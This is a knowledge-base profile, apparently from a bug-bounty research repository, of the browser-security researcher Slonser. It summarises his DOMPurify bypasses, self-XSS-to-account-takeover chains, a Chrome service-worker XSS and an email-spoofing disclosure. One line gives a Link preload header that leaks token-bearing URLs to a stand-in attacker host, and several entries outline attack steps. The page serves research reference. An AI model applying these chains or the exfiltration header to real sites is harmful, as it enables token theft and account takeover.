---
title: Vsevolod Kokorin (Slonser)
slug: slonser
created_utc: 2026-05-15T00:00:00Z
updated_utc: 2026-05-15T00:00:00Z
handles: [slonser_, slonser, slonser-s]
role: researcher
primary_focus: client-side
tags: [person, role/researcher, focus/client-side, focus/dom-xss, focus/dompurify, focus/browser-bugs, focus/chrome, focus/caido, focus/0day]
inbound: []
---

# Vsevolod Kokorin (Slonser)

## Identity

- Real name: **Vsevolod Kokorin**. Publishes under handle **Slonser** (X: `@slonser_`).
- Russian client-side / browser-bug researcher.
- **Security researcher at Solidlab**; **co-founder of neploxaudit**.
- CTF player on **C4T BuT S4D**.
- Repeated 0day-class disclosures against Chrome and against widely-deployed sanitizers (DOMPurify). Microsoft email-spoofing disclosure went public after MSRC dismissed the report (TechCrunch, 2024).

## Focus areas

- **Client-side 0day** — Chrome XSS vectors, sanitizer bypasses, and novel HTML/CSP injection chains that escalate to ATO.
- **DOMPurify internals** — multiple published bypasses (untrusted node confusion, dirty-namespace) sitting alongside Mizu's catalog.
- **Self-XSS escalation** — converting "self-only" XSS into stored/cross-account XSS via credentialless iframes, login-CSRF, and `fetchLater`.
- **Image / HTML injection → leak** — `<img>` + `Link: rel=preload; referrerpolicy=unsafe-url` to exfiltrate full URL query parameters; the basis of the Ep 121 ATO chain.
- **Caido tooling** — author of Caido plugins (Ebka AI assistant; Caido MCP integration) and a frequent collaborator on Caido community plugins.
- **Browser extensions security** — 2024 deep-dive resource on extension attack surface.

## Online presence

- Blog: [blog.slonser.info](https://blog.slonser.info).
- "Who am I" page: [blog.slonser.info/posts/who-am-i/](https://blog.slonser.info/posts/who-am-i/).
- X / Twitter: [@slonser_](https://x.com/slonser_).
- GitHub (primary): [github.com/Slonser](https://github.com/Slonser).
- GitHub (secondary handle referenced by CT): [github.com/Slonser-s](https://github.com/Slonser-s).
- Telegram: `@Slonser`.
- Standoff365 profile: [standoff365.com/en-US/profile/Slonser/](https://standoff365.com/en-US/profile/Slonser/).
- Affiliations: [Solidlab](https://solidlab.io), [neploxaudit](https://neplox.security).

## Key research / posts

- **[Make Self-XSS Great Again](https://blog.slonser.info/posts/make-self-xss-great-again/)** (2025-06-13) — Credentialless iframes stay same-origin with the parent frame while isolating cookies, so a login-CSRF'd iframe lets the attacker run their own self-XSS inside the victim's origin and reach `window.top[1].document.cookie` for the victim's real cookies. Adds clickjacking and `fetchLater` (deferred-after-close) variants for when iframe embedding or post-nav state gets in the way. Direct seed for `../techniques/dom-xss/credentialless-iframe-login-csrf.md` and `../techniques/dom-xss/fetchlater-redirect-persistence.md`.
- **Image Injection → ATO via `Link: rel=preload; referrerpolicy=unsafe-url`** (2025-05, X thread + Ep 121) — HTML / `<img src>` injection where the response carries a `Link: <https://attacker/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"` header. Browser preloads the image and sends the full referring URL (query string included) to the attacker. Turns any HTMLi that controls a response sub-resource into a token leak; chains into ATO when the leaked URL holds a reset/SSO token. Pairs with `../techniques/dom-xss/window-name-exfil.md` and `../techniques/dom-xss/taint-flow-open-redirect.md`.
- **[CVE-2023-5480: Chrome new XSS Vector](https://blog.slonser.info/posts/cve-2023-5480/)** (2024-01-25) — Chrome's Payment Request API will retrieve payment manifests from response bodies (a 2020 spec change), and JIT-installed Service Workers from that flow are not uninstalled afterward. Upload a manifest-shaped file to any "downloads-with-attachment" endpoint (GitLab artifacts, S3 with permissive MIME), point a payment manifest at it, and you get a persistent Service Worker on the victim origin — same-origin XSS with persistence. $16k Google VRP, three years dormant. Seed for `../techniques/dom-xss/service-worker-allowed-scope-hijack.md`.
- **[DOM Purify — dirty namespace bypass](https://blog.slonser.info/posts/dompurify-dirty-namespace-bypass/)** (2024-12-09) — Namespace-confusion bypass against DOMPurify; sibling to Mizu's namespace-hijack work. Cross-link target: `../techniques/dom-xss/dompurify-namespace-hijack-getbyid.md`.
- **[DOM Purify — untrusted Node bypass](https://blog.slonser.info/posts/dompurify-node-type-confusion/)** (2024-03-19) — Node-type confusion: pass a crafted Node into DOMPurify so the sanitizer's tree-walk treats one node-kind as another and emits attacker-controlled markup. Discussed by Slonser on the CT show ("DOM Purify Type Confusion by @slonser_"). Cross-link: `../techniques/dom-xss/dompurify-post-output-replace.md`.
- **[Why Protocol Matters: Evil PWA Attack on Casdoor](https://blog.slonser.info/posts/why-protocol-matters/)** (2025-02-05) — PWA-protocol abuse against the Casdoor SSO; protocol-handler registration becomes an auth-flow hijack.
- **[Old new email attacks](https://blog.slonser.info/posts/email-attacks/)** (2024-05-23) — Email-header / display-name parsing inconsistencies; the research that fed the Microsoft Outlook spoofing disclosure ([TechCrunch coverage](https://techcrunch.com/2024/06/18/security-bug-allows-anyone-to-spoof-microsoft-employee-emails/)).
- **[Exploring IPv6 Zone Identifier](https://blog.slonser.info/posts/ipv6-zones/)** (2024-04-06) — IPv6 zone-id parsing surface; SSRF / URL-parser confusion territory.
- **[MySQL2: Dangers of User-Defined Database Connections](https://blog.slonser.info/posts/mysql2-attacker-configuration/)** (2024-03-26) — Server-side, but referenced in his client-side chains where attacker-controlled DB-config crosses into prototype pollution.
- **[Never Trust the Output: Data Pollution in AI Agents and MCP](https://blog.slonser.info/posts/smugglle-ai-ouputs/)** (2026-01-07) — Output-smuggling against AI/MCP agents; the current direction of his work as agentic surfaces grow.
- **[Browser Extensions attack-surface resource](https://x.com/slonser_/status/1880341105398665583)** (2025-01) — Compiled X-thread / resource on extension attacks (message passing, content-script trust, manifest gotchas).

## Tooling

- **[Ebka-Caido-AI](https://github.com/Slonser/Ebka-Caido-AI)** — AI-powered assistant plugin for Caido (TypeScript, ~77 stars). Natural-language driven security testing inside the Caido proxy. Relevant to our `caido-capture` / `caido-replay` flows: a reference for how third-party Caido plugins shape the request/response surface we automate against.
- **Caido MCP** — Model Context Protocol bridge for Caido (announced via X). Same problem class as our own `bin/caido-mcp.py` wrapper; cross-reference when extending Caido tool surface.
- **[hui](https://github.com/Slonser/hui)** — "HTML Universal Identifier" (Python, ~68 stars). HTML-processing utility; useful when triaging sanitizer output diffs.

## CT podcast appearances

- [2025-05-08 Ep 121 — Slonser's Image Injection 0-day → ATO & New Caido Collab Plugin](../sources/podcasts/ct/20250508_Ae4cR00P9LU_Slonser_s_Image_Injection_0-day_-_ATO_New_Caido_Collab_Plugin_Ep._121.en.vtt) — Walkthrough of the `Link: rel=preload; referrerpolicy=unsafe-url` query-string-leak chain and its escalation to ATO; introduction of the joint Caido plugin. Episode page: [criticalthinkingpodcast.io/episode-121-slonsers-image-injection-0-day-ato-new-caido-collab-plugin](https://www.criticalthinkingpodcast.io/episode-121-slonsers-image-injection-0-day-ato-new-caido-collab-plugin/); HackerNotes: [blog.criticalthinkingpodcast.io/p/hackernotes-ep-121-slonser-image-injection-0-day](https://blog.criticalthinkingpodcast.io/p/hackernotes-ep-121-slonser-image-injection-0-day); YouTube: [youtube.com/watch?v=Ae4cR00P9LU](https://www.youtube.com/watch?v=Ae4cR00P9LU).
- Earlier CT short: [DOM Purify Type Confusion by @slonser_](https://www.criticalthinkingpodcast.io/videos/dom-purify-type-confusion-by-slonser/) — companion to the 2024-03 untrusted-Node-bypass blog post.

## Notes

- **Client-side 0day specialist.** Pattern across his catalog: find a spec corner everyone treats as benign (Payment manifests in response bodies; credentialless iframes treated as "isolated"; `Link: rel=preload` resolving relative URLs with the request's referrer policy; DOMPurify's namespace handling) and weaponize it into XSS-or-better. When a target ships any of these surfaces (Payment API + downloads, sanitizer in a security-critical position, iframe embedding allowed on auth-flow pages), his work is the first reference to pull.
- **Caido contributor.** Active in the Caido plugin ecosystem (Ebka AI; Caido MCP). Relevant to our `caido-capture` skill — his plugin patterns and the joint CTBB+Caido plugin announced on Ep 121 are likely to surface in Caido updates we ingest.
- **Disclosure style** — willing to go public when vendors dismiss. The 2024 Microsoft Outlook spoofing case (TechCrunch) is the canonical example: report dismissed, demoed live by sending a spoofed email "from Microsoft" to a journalist. Useful prior when modeling vendor-response risk on similar bugs.
- **Collaborators** — orbits the Russian/CIS research scene (Solidlab, neploxaudit, C4T BuT S4D CTF), but ships to Western platforms (HackerOne, Google VRP, Chrome). Frequent guest / collaborator on the Critical Thinking Bug Bounty Podcast.
- **Cross-refs** — research seeds `../techniques/dom-xss/credentialless-iframe-login-csrf.md`, `../techniques/dom-xss/fetchlater-redirect-persistence.md`, `../techniques/dom-xss/service-worker-allowed-scope-hijack.md`, `../techniques/dom-xss/dompurify-namespace-hijack-getbyid.md`, `../techniques/dom-xss/dompurify-post-output-replace.md`, `../techniques/dom-xss/window-name-exfil.md`, and `../techniques/dom-xss/taint-flow-open-redirect.md`. Tooling pairs with `../tools/caido/` notes (when added).
